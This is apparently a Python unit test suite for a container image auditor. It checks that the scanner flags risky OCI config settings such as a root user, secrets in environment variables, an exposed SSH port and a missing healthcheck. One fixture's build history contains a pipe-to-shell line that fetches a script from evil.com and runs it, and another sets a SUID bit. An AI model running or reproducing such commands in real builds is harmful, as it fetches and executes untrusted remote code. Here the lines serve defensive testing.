# ==============================================================================
# Product:       lh-container-auditor (lh-container)
# Module:        tests.test_oci_scanner
# Role:          Test Suite & Rule Verification
# Organization:  Logihertz Systems (OPC) Private Limited (logihertzsystems)
# Creator:       Sameer Tawade (Creator, Founder, Director & Whole and Sole Developer)
# Contact:       ops@logihertz.com | https://logihertz.com/
# License:       Apache License 2.0 (SPDX-License-Identifier: Apache-2.0)
# ==============================================================================

"""Unit tests for OciScanner."""

from __future__ import annotations

import io
import json
import tarfile
from pathlib import Path

from lh_container_auditor.oci_scanner import OciScanner, scan_oci


def test_oci_json_config(tmp_path: Path) -> None:
    """Test scanning a standalone container config JSON file."""
    config_data = {
        "architecture": "amd64",
        "config": {
            "User": "root",
            "Env": [
                "PATH=/usr/local/bin:/usr/bin",
                "DB_PASSWORD=my_secret_production_password",
                "SAFE_VAR=${TEST}",
            ],
            "ExposedPorts": {
                "22/tcp": {},
                "8080/tcp": {},
            },
            "Healthcheck": None,
        },
        "history": [
            {"created_by": "RUN curl -s https://evil.com/setup | sh"},
            {"created_by": "RUN chmod 4755 /bin/suid_helper"},
        ],
    }
    cfg_file = tmp_path / "config.json"
    cfg_file.write_text(json.dumps(config_data))

    scanner = OciScanner(str(cfg_file))
    res = scanner.scan()

    rule_ids = {f.rule_id for f in res.findings}
    assert "LH-CONT-002" in rule_ids  # User is root
    assert "LH-CONT-003" in rule_ids  # Secret in Env
    assert "LH-CONT-008" in rule_ids  # Port 22 exposed
    assert "LH-CONT-009" in rule_ids  # Missing Healthcheck
    assert "LH-CONT-004" in rule_ids  # Pipe to shell in history
    assert "LH-CONT-010" in rule_ids  # SUID in history


def test_oci_clean_config(tmp_path: Path) -> None:
    """Test clean OCI container config with no violations."""
    config_data = {
        "config": {
            "User": "10001:10001",
            "Env": [
                "PATH=/usr/local/bin:/usr/bin",
                "NODE_ENV=production",
            ],
            "ExposedPorts": {
                "8080/tcp": {},
                "443/tcp": {},
            },
            "Healthcheck": {
                "Test": ["CMD", "curl", "-f", "http://localhost:8080/health"],
            },
        },
        "history": [
            {"created_by": "COPY app /app"},
        ],
    }
    cfg_file = tmp_path / "clean_config.json"
    cfg_file.write_text(json.dumps(config_data))

    res = scan_oci(cfg_file)
    assert len(res.findings) == 0


def test_oci_tar_archive(tmp_path: Path) -> None:
    """Test scanning a saved Docker image tarball."""
    config_dict = {
        "config": {
            "User": "",  # Empty user -> defaults to root
            "Env": ["API_KEY=AIzaSyD1234567890abcdef"],
            "Healthcheck": None,
        }
    }
    config_bytes = json.dumps(config_dict).encode("utf-8")

    manifest_dict = [
        {
            "Config": "config_blob.json",
            "RepoTags": ["myapp:latest"],
            "Layers": [],
        }
    ]
    manifest_bytes = json.dumps(manifest_dict).encode("utf-8")

    tar_path = tmp_path / "image.tar"
    with tarfile.open(tar_path, "w") as tar:
        ti_m = tarfile.TarInfo(name="manifest.json")
        ti_m.size = len(manifest_bytes)
        tar.addfile(ti_m, io.BytesIO(manifest_bytes))

        ti_c = tarfile.TarInfo(name="config_blob.json")
        ti_c.size = len(config_bytes)
        tar.addfile(ti_c, io.BytesIO(config_bytes))

    res = scan_oci(tar_path)
    rule_ids = {f.rule_id for f in res.findings}
    assert "LH-CONT-002" in rule_ids
    assert "LH-CONT-003" in rule_ids


def test_oci_layout_directory(tmp_path: Path) -> None:
    """Test scanning an OCI image layout directory structure."""
    layout_dir = tmp_path / "oci_layout"
    layout_dir.mkdir()
    (layout_dir / "oci-layout").write_text('{"imageLayoutVersion": "1.0.0"}')

    config_hash = "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"
    manifest_hash = "1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"

    blobs_dir = layout_dir / "blobs" / "sha256"
    blobs_dir.mkdir(parents=True)

    config_data = {
        "config": {
            "User": "root",
            "Healthcheck": None,
        }
    }
    (blobs_dir / config_hash).write_text(json.dumps(config_data))

    manifest_data = {
        "schemaVersion": 2,
        "config": {
            "mediaType": "application/vnd.oci.image.config.v1+json",
            "digest": f"sha256:{config_hash}",
            "size": 100,
        },
        "layers": [],
    }
    (blobs_dir / manifest_hash).write_text(json.dumps(manifest_data))

    index_data = {
        "schemaVersion": 2,
        "manifests": [
            {
                "mediaType": "application/vnd.oci.image.manifest.v1+json",
                "digest": f"sha256:{manifest_hash}",
                "size": 200,
            }
        ],
    }
    (layout_dir / "index.json").write_text(json.dumps(index_data))

    res = scan_oci(layout_dir)
    rule_ids = {f.rule_id for f in res.findings}
    assert "LH-CONT-002" in rule_ids
    assert "LH-CONT-009" in rule_ids


def test_oci_error_handling(tmp_path: Path) -> None:
    """Test error handling for non-existent and corrupt targets."""
    res_nonexistent = scan_oci(tmp_path / "does_not_exist")
    assert res_nonexistent.error_message is not None

    invalid_json = tmp_path / "bad.json"
    invalid_json.write_text("{not valid json")
    res_bad = scan_oci(invalid_json)
    assert res_bad.error_message is not None
